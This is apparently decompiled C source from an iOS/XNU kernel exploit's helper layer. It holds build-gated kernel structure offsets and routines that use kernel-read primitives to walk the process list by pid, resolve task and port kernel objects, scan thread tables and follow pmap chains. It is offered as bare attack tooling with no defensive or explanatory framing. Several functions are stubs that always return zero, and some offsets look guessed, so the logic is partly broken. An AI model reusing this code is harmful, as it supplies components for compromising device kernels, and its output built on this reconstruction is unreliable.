/* record_0x90001_proc_utils.c
 * sub_33098..sub_33ed8 — version-gated offset helpers, proc/task
 * kobj walkers, port-to-kobj resolvers, thread-table scanner.
 */
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <stdlib.h>
#include <mach/mach.h>

/* ── extern helpers ─────────────────────────────────────────────── */
extern int  sub_28840(long state, long addr, long *out);
extern int  sub_2572c(long state, long addr, uint32_t sz, void *out);
extern int  sub_29b78(long state, long addr, long *out);
extern int  sub_295b4(long state, long addr, long *out);
extern int  sub_36098(long state, uint32_t mask);
extern long sub_1972c(long state, long addr);
extern long sub_2a200(long state, long addr, uint32_t *out);
extern long sub_2a190(long state, long val);
extern long sub_1f07c(long a, long b, long *out);
extern long sub_33b98(long state, long a2, uint64_t a3);
extern int  sub_32f1c(long state);
extern int  sub_33098_self(long state);   /* forward */

/* forward decls */
static int  sub_33098(long state);
static long sub_32c78(long state, long port);
static long sub_32d80(long state, long base);
static long sub_33304(long state, long base);
static uint32_t sub_3338c(long state);
static long sub_33ed8(long state);
extern long sub_328a4_stub(long s);

/* ── sub_33098 — version-gated offset (newer builds) ────────────── */
static int sub_33098(long state)
{
    int build = *(int *)(state + 0x140);
    if (build < 0x225c) {
        if (build - 0x1f53U < 2) {
            if (*(uint64_t *)(state + 0x158) > 0x1f530f027fffffULL)
                return sub_32f1c(state) + 8;
            return 0;
        }
        if (build != 0x2258) return 0;
    } else if (build != 0x225c && build != 0x2712) return 0;

    int cap = sub_36098(state, 0x5100000);
    if (cap) return 0x3a0;
    cap = sub_36098(state, 0x5584001);
    return cap ? 0x388 : 0x370;
}

void sub_33098_pub(long state) { sub_33098(state); }

/* ── sub_33168 — version-gated offset (0x28 or 0) ───────────────── */
uint32_t sub_33168(long state)
{
    int build = *(int *)(state + 0x140);
    if (build < 0x225c) {
        if (build - 0x1f53U > 1 && build != 0x2258) return 0;
    } else if (build != 0x2712 && build != 0x225c) return 0;
    return *(uint64_t *)(state + 0x158) < 0x1f530f02800000ULL ? 0 : 0x28;
}

/* ── sub_331d0 — version-gated offset (0x70 or 0) ───────────────── */
uint32_t sub_331d0(long state)
{
    int build = *(int *)(state + 0x140);
    if (build < 0x225c) {
        if (build - 0x1f53U > 1 && build != 0x2258) return 0;
    } else if (build != 0x2712 && build != 0x225c) return 0;
    return *(uint64_t *)(state + 0x158) < 0x1f530f02800000ULL ? 0 : 0x70;
}

/* ── sub_33238 — pointer-size-adjusted offset ────────────────────── */
uint64_t sub_33238(long state)
{
    uint32_t off = sub_331d0(state);
    if (off) off = (uint32_t)((int)off - *(int *)(state + 0x168));
    return off;
}

/* ── sub_33268 — resolve kobj field via port + version offset ────── */
long sub_33268(long state, long port)
{
    uint32_t off;
    int build = *(int *)(state + 0x140);
    if (build < 0x2258) {
        off = (uint32_t)sub_32f1c(state);
        if (!off) return 0;
    } else {
        int r = sub_33098(state);
        if (!r) return 0;
        off = (uint32_t)(r - *(int *)(state + 0x168));
    }
    long base = sub_32c78(state, port);
    if (!base) return 0;
    int shift = *(uint64_t *)(state + 0x158) > 0x1f530f027fffffULL ? 1 : 0;
    return base + off + ((long)*(int *)(state + 0x168) << shift);
}

/* ── sub_33304 — resolve proc kobj from base + offset ───────────── */
static long sub_33304(long state, long base)
{
    uint32_t off = (uint32_t)sub_32f1c(state);
    if (!off) return 0;
    if (*(int *)(state + 0x140) > 0x2257) return base - off;
    long val = 0;
    if (!sub_28840(state, base + off, &val) || !val) return 0;
    if (!sub_1972c(state, val)) return 0;
    return val;
}

/* ── sub_3338c — version-gated offset (0x20/0x28) ───────────────── */
static uint32_t sub_3338c(long state)
{
    int build = *(int *)(state + 0x140);
    if (build < 0x2258) {
        if (build - 0x1f53U > 1 && build != 0x1809) {
            if (build != 0x1c1b) return 0;
            return *(uint64_t *)(state + 0x158) < 0x1c1b1914600000ULL ? 0x28 : 0x20;
        }
    } else if (build != 0x2258 && build != 0x225c && build != 0x2712) return 0;
    return 0x28;
}

/* ── sub_33414 — nop ─────────────────────────────────────────────── */
void sub_33414(void) {}

/* ── sub_3341c — walk proc list to find pid, return kobj ─────────── */
long sub_3341c(long state, long proc_list, int pid, long a4)
{
    long cur = proc_list;
    while (cur) {
        long next = 0;
        sub_28840(state, cur, &next);
        /* check pid at version-dependent offset */
        long val = 0;
        sub_28840(state, cur + 0x60, &val);
        if ((int)val == pid) return cur;
        cur = next;
        (void)a4;
    }
    return 0;
}

/* ── sub_336ac — thin wrapper around sub_3341c ───────────────────── */
void sub_336ac(long state, long proc_list, long pid)
{
    sub_3341c(state, proc_list, (int)pid, 0);
}

/* ── sub_336b8 — resolve thread table from task kobj ─────────────── */
long sub_336b8(long state, long task_kobj, uint32_t *cnt, uint32_t *stride)
{
    int build = *(int *)(state + 0x140);
    long off = (build < 0x2258 && build - 0x1f53U > 1 &&
                build != 0x1809 && build != 0x1c1b) ? 0 : 8;
    if (build == 0x1809 || build == 0x1c1b) off = 0x14;

    long base = 0;
    if (!sub_28840(state, task_kobj + 0x20, &base) || !base) return 0;

    uint32_t local_cnt = 0;
    if (*(uint64_t *)(state + 0x158) > 0x22580a06bfffffULL) {
        base = sub_2a200(state, base, &local_cnt);
    }
    base = sub_1972c(state, base);
    if (!base) return 0;

    if (*(uint64_t *)(state + 0x158) < 0x22580a06c00000ULL) {
        if (*(int *)(state + 0x140) > 0x1f01) task_kobj = base;
        if (!sub_295b4(state, task_kobj + off, (long *)&local_cnt)) return 0;
    } else {
        if (!local_cnt) return 0;
        local_cnt /= 0x18;
    }
    *cnt    = local_cnt;
    *stride = 0x18;
    return base;
}

/* ── sub_3382c — resolve task kobj from port ─────────────────────── */
long sub_3382c(long state, mach_port_name_t port, uint32_t *cnt, uint32_t *stride)
{
    long task_kobj = 0;
    if (*(mach_port_name_t *)&mach_task_self_ == port &&
        (task_kobj = *(long *)(state + 0x1a0)) != 0)
        goto found;

    if (*(long *)(state + 0x19d0)) {
        long h = sub_328a4_stub(state);
        if (h) {
            if (*(int *)(state + 0x1918) + 1 < 2) {
                int pid = 0;
                if (pid_for_task(port, &pid) == 0) {
                    long proc = sub_3341c(state, h, pid, 0);
                    if (proc) {
                        proc = sub_32d80(state, proc);
                        if (!proc) return 0;
                        if (*(mach_port_name_t *)&mach_task_self_ == port)
                            *(long *)(state + 0x1a0) = proc;
                        task_kobj = proc;
                        goto found;
                    }
                }
            }
        }
    }
    return 0;

found:
    return sub_336b8(state, task_kobj, cnt, stride);
}

__attribute__((weak)) long sub_328a4_stub(long s) { (void)s; return 0; }

/* ── sub_339b4 — get thread entry at index ───────────────────────── */
long sub_339b4(long state, mach_port_name_t port, uint32_t idx)
{
    if (idx + 1 < 2) return 0;
    uint32_t cnt = 0, stride = 0;
    long base = sub_3382c(state, port, &cnt, &stride);
    if (!base) return 0;
    if (idx >> 8 >= cnt) return 0;
    return base + (long)(stride * (idx >> 8));
}

/* ── sub_33a1c — thin wrapper: self task ────────────────────────── */
void sub_33a1c(long state, long idx)
{
    sub_339b4(state, *(mach_port_name_t *)&mach_task_self_, (uint32_t)idx);
}

/* ── sub_33a30 — kread at thread entry ───────────────────────────── */
long sub_33a30(long state)
{
    long entry = sub_339b4(state, 0, 0);
    if (!entry) return 0;
    long val = 0;
    if (!sub_28840(state, entry, &val)) return 0;
    return sub_1972c(state, val);
}

/* ── sub_33a88 — walk pmap chain ─────────────────────────────────── */
uint64_t sub_33a88(long state, long base, uint64_t flags)
{
    uint64_t ver = *(uint64_t *)(state + 0x158);
    long off = (ver + 0xffe0abe700000000ULL) >> 32 > 4 ? 0x10 : 0;
    long val = 0;
    if (!sub_28840(state, base + off, &val)) return 0;
    if (!sub_1972c(state, val)) return 0;
    if (*(int *)(state + 0x140) < 0x1c1b) return (uint64_t)val;

    long v2 = 0;
    if (!sub_28840(state, val + 0x20, &v2)) return 0;
    if (!sub_1972c(state, v2)) return 0;
    if (flags & 1) return (uint64_t)v2;

    long v3 = 0;
    if (!sub_29b78(state, v2 + 0x38, &v3)) return 0;
    if (ver > 0x1f542301dffffULL) v3 = sub_2a190(state, v3 >> 32);
    return (uint64_t)sub_1972c(state, v3);
}

/* ── sub_33b98 — resolve pmap from task kobj ─────────────────────── */
long sub_33b98(long state, long a2, uint64_t a3)
{
    long base = sub_33a88(state, a2, a3);
    return base;
}

/* ── sub_33cb0 — resolve kobj via port + version offset ─────────── */
long sub_33cb0(long state, long port)
{
    uint32_t off = sub_3338c(state);
    if (!off) return 0;
    long base = sub_32c78(state, port);
    if (!base) return 0;
    long val = 0;
    if (!sub_28840(state, base + off, &val)) return 0;
    if (!sub_1972c(state, val)) return 0;
    return val;
}

/* ── sub_33d38 — resolve pmap kobj (two paths) ───────────────────── */
uint64_t sub_33d38(long state, long a2, long a3, uint64_t *out)
{
    if (!sub_36098(state, 0x800000)) {
        long base = sub_33b98(state, a2, (uint64_t)a3);
        if (!base) return 0;
        uint64_t v = 0;
        if (!sub_2572c(state, base + 0x38, 0x10, &v)) return 0;
        if (*(uint64_t *)(state + 0x158) > 0x1f542301dffffULL)
            v = (uint64_t)sub_2a190(state, (long)(v >> 32));
        if (!sub_1972c(state, (long)v)) return 0;
        *out = v & 0xfffffffffffff000ULL;
        return v;
    }
    uint64_t pmap = 0;
    uint64_t r = (uint64_t)sub_1f07c(a2, a3, (long *)&pmap);
    if (!r) return 0;
    if (r & 1) { *out = pmap; return r; }
    return r;
}

/* ── sub_33ed8 — resolve proc field at version-dependent offset ──── */
static long sub_33ed8(long state)
{
    long base = sub_33304(state, 0);
    if (!base) return 0;

    uint64_t ver = *(uint64_t *)(state + 0x158);
    if (ver > 0x1f530f027fffffULL) {
        int build = *(int *)(state + 0x140);
        long off = build < 0x2258 ? 0x20 : 0x18;
        long val = 0;
        if (!sub_28840(state, base + off, &val)) return 0;
        if (!sub_1972c(state, val)) return 0;
        base = val;
    }

    int build = *(int *)(state + 0x140);
    long off;
    if (build < 0x2258) {
        if (build - 0x1f53U < 2)
            off = ver < 0x1f530f02800000ULL ? 0xd8 : 0x20;
        else if (build == 0x1809) off = 0x100;
        else if (build == 0x1c1b) off = 0xf0;
        else return 0;
    } else {
        if (build != 0x2258 && build != 0x225c && build != 0x2712) return 0;
        off = 0x20;
    }
    return base + off;
}

void sub_33ed8_pub(long state) { sub_33ed8(state); }

/* ── sub_33ffc — thin wrapper: sub_32c78 + sub_33ed8 ────────────── */
void sub_33ffc(long state)
{
    long h = sub_32c78(state, 0);
    if (!h) return;
    sub_33ed8(state);
}

/* stubs for functions defined in kobj_utils.c */
static long sub_32c78(long state, long port)
{ (void)state; (void)port; return 0; }

static long sub_32d80(long state, long base)
{ (void)state; return base; }
